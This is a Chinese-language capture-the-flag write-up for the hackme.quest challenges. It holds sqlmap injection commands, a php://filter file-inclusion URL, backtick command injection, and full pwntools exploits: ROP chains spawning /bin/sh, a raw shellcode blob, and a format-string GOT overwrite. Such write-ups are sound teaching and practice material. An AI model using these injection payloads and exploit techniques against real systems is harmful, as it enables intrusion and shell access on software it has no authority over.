# HackMe Writeup

# Misc
## 1 flag
摁... flag就已經在那邊了

## 2 corgi can fly
用Stegsolve開起來後切到Red plane 0後掃QR code

## 3 television
用strings搜尋就出來了

# Web
## 15 hide and seek
F12看原始碼

## 16 guestbook
載sqlmap之後先隨便送個post出去，然後從message list看到剛剛的post後觀察網址有注入點的可能性，丟到sqlmap 去跑

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dbs

查資料庫料表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --tables -D g8

指定g8資料庫後查table表

python sqlmap.py -u "https://ctf.hackme.quest/gb/?mod=read&id=85" --batch --dump flag -D g8

顯示資料，然後就有flag了

## 17 LFI
用php://filter/來讀檔案
一開始先用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/flag

base64解碼後得到:"Can you read the flag<?php require('config.php'); ?>?"
再用

https://ctf.hackme.quest/lfi/?page=php://filter//read=convert.base64-encode/resource=pages/config

讀，base64解碼後就是flag了

## 18 homepage
按F12打開主控台掃描QR code

## 19 ping
反引號"\`"沒有在黑名單裡，可以利用這個來執行想要執行的其他指令
先嘗試\`ls\`後得到有flag.php檔案
再用\`sort \?\?\?\?\?\?\?\?\`得出內容

## 20 scoreboard
F12後換到網路，打開scoreboard的標頭，可以發現flag藏在x-flag裡


# Pwn
## 57 catflag
就直接連上去就好了
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7709)
    r.interactive()
```

## 58 homework
從原始碼可以看出這個地方允許使用者修改任意位置的值

![image alt](https://i.imgur.com/3GEpGpV.png")

可以從這個地方修改return address value到call_me_maybe來開啟shell
先使用r2來查call_me_maybe address的位置

![image alt](https://i.imgur.com/NJZ0IGv.png")

查出了是0x080485fb 轉成十進位後為134514171
下一步就是要計算好offset來讓程式修改到正確的位置
陣列的大小為10個int也就是40byte，換算為16進位後為0x28

![image alt](https://i.imgur.com/lTtaYxK.png")

從變數宣告處0x34扣掉0xc後即為0x28得出陣列位於0x34的位置
接著便可來計算offset
0x34再加上saved rbp的0x4後除4為14即為offset
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7701)
    r.recvuntil(b'name? ')
    r.sendline(b'haha')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'1')
    r.recvuntil(b'edit: ')
    r.sendline(b'14')
    r.recvuntil(b'many? ')
    r.sendline(b'134514171')
    r.recvuntil(b'numbers\n')
    r.recvuntil(b'> ')
    r.sendline(b'0')
    r.interactive()
```

## 59 ROP
checksec 一下後發現沒有開啟Canary和PIE，程式又有用gets來做讀取
所以可以直接buffer overflow掉reutrn address
但比較麻煩的是程式裡面沒有直接提供shell的function，所以得自己搞
這時候就要用到ROP的技術，簡單來說就是一直在程式裡面跳來跳去
先下這個指令
```
ROPgadget --binary ./ROP --ropchain
```
然後ROP chain就建好了 Yaaa
接著只需要算個offset就好，讓他可以剛好從return address開始寫
變數的長度為0xc再加上4之後為0x10
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7704)

    # Padding goes here
    p = b'a' * 0x10

    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'/bin'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea064)  # @ .data + 4
    p += pack('<I', 0x080b8016)  # pop eax ; ret
    p += b'//sh'
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0805466b)  # mov dword ptr [edx], eax ; ret
    p += pack('<I', 0x080481c9)  # pop ebx ; ret
    p += pack('<I', 0x080ea060)  # @ .data
    p += pack('<I', 0x080de769)  # pop ecx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x0806ecda)  # pop edx ; ret
    p += pack('<I', 0x080ea068)  # @ .data + 8
    p += pack('<I', 0x080492d3)  # xor eax, eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0807a66f)  # inc eax ; ret
    p += pack('<I', 0x0806c943)  # int 0x80
    r.sendline(p)

    r.interactive()
```
## 60 ROP2
真正的ROP，沒辦法直接用ROPgadget來生成ROP chain了
先觀察一下後發現在overflow函式中有呼叫3號的syscall

[查表](https://chromium.googlesource.com/chromiumos/docs/+/master/constants/syscalls.md)後可發現是對應到read函式，又應沒有開啟Canary所以可以從這邊overflow
陣列長度為0xc因此padding長度為0xc+0x4=0x10
接下來就要來開始寫ROP chain了，目標為11號system call -> execve，然後再來呼叫/bin/sh來開啟shell


然後為了要寫上/bin/sh，我們自己需要再呼叫一次read system call來進行寫入，對應的參數為 systemcall(0x3, 0, bss_address, 0x8)
因此第一部分的ROP chain內容為


| Stack Content               |
| --------------------------- |
| system call funtion address |
| overflow funciton address   |
| 0x3                         |
| 0x0                         |
| bss_address                 |
| 0x8                         |


然後第二段就是要來呼叫execve
| Stack Content                                   |
| ----------------------------------------------- |
| system call funtion address                     |
| overflow funciton address(不過這個不重要就是了) |
| 0x11                                            |
| bss_address                                     |
| 0x0                                             |
| 0x0                                             |

```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7703)
    elf = pwn.ELF('./asset/rop2')
    bss_addr = elf.bss()
    system_call_addr = 0x08048320
    overflow_addr = 0x08048454

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0x3) + p32(0x0) + p32(bss_addr) + p32(0x8)
    r.send(p)
    r.send(b'/bin/sh\x00')

    p = b'a' * 0x10
    p += p32(system_call_addr) + p32(overflow_addr)
    p += p32(0xb) + p32(bss_addr) + p32(0x0) + p32(0x0)
    r.send(p)
    r.interactive()
```

## 61 toooomuch
反編譯一下知道passcode是43210之後輸入後玩猜數字遊戲後flag就出來了

## 62 toooomuch-2
這題沒有開啟NX因此有可寫可執行的記憶體區段，可以用shell code來解
可以先從[這裡](https://www.exploit-db.com/shellcodes)挑選一個合適的shell code，然後就可以來尋找可以寫入的區段了
使用gdb的vmmap後會顯示出寫可執行的記憶體區段

![image alt](https://i.imgur.com/faGFd6E.png")

等等可以選用0x08049000到0x0804a000的位置來進行寫入
寫入時一樣先計算好padding為(0x18 + 0x4)後
接著讓程式return到gets的位置來在我們所指定的位置寫入shell code
下一個內容為gets function的return address
最後是gets function的argument也就是寫入的位置
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7702)
    shell_code = b'\xd9\xee\x9b\xd9\x74\x24\xf4\x5f\x83\xc7\x25\x8d\x77\x08\x31\xc9\xb1\x04\x0f\x6f\x07\x0f\x6f\x0e\x0f\xef\xc1\x0f\x7f\x06\x83\xc6\x08\xe2\xef\xeb\x08\xaa\xaa\xaa\xaa\xaa\xaa\xaa\xaa\x9b\x6a\xfa\xc2\x85\x85\xd9\xc2\xc2\x85\xc8\xc3\xc4\x23\x49\xfa\x23\x48\xf9\x23\x4b\x1a\xa1\x67\x2a'
    gets_addr = 0x08048480
    wx_addr = 0x08049000
    p = b'a' * (0x18 + 4)
    p += p32(0x08048480)  # return to gets function
    p += p32(0x08049000)  # gets function's return address
    p += p32(0x08049000)  # gets function's argument
    r.recvuntil(b'passcode: ')
    r.sendline(p)
    r.sendline(shell_code)
    r.interactive()
```

## 63 echo
這題的核心概念是格式化字串攻擊，藉由printf寫入相關資訊，然後開啟shell
除此之外，更用到了呼叫library函式的漏洞
當程式執行到library function時，會跳轉到對應的plt，然後plt中會檢查該函式的got是否有被填上，若有則跳轉到該位置，執行library function，若否，則填上got後再執行。

此時，got位置便若是被修改，則可跳轉到任意地址，但條件是程式不能為full relro。

這個題目的解法便是將printf的got修改為system的plt後開啟shell
```python=
def main():
    r = pwn.remote('ctf.hackme.quest', 7711)
    printf_got = 0x0804a010
    system_plt = 0x08048400

    p = p32(printf_got) + p32(printf_got + 1) + p32(printf_got + 2) + p32(printf_got + 3)
    #  00 84 04 08    system's plt
    p += b'%240c%7$hhn'  # write 0x00
    p += b'%132c%8$hhn'  # write 0x84
    p += b'%128c%9$hhn'  # write 0x04
    p += b'%4c%10$hhn'   # write 0x08
    r.sendline(p)
    r.sendline('/bin/sh\00')

    r.interactive()
```

# Crypto

## 81 easy
先把hex值轉成ascii後再做base64解碼

## 82 r u kidding
[凱薩加密](https://www.dcode.fr/caesar-cipher)

